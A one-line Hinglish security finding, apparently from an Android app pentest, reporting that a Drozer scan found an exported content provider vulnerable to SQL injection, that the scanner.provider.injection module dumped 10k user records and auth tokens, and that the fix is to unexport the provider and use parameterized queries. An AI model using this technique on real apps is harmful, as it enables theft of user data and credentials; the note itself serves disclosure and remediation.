Drozer scan se mila exported provider with SQLi — scanner.provider.injection se DB dump kiya: 10k users + auth tokens. Fix: unexport + parameterized queries.
